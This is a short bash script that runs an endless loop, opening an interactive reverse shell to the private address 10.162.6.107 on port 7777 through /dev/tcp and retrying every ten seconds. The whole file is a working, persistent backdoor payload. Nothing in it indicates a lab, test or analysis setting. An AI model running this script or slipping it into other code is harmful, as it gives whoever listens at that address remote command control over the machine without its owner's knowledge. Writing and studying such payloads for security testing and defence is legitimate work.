#!/bin/bash

while true; do
	bash -i >& /dev/tcp/10.162.6.107/7777 0>&1
	sleep 10
done

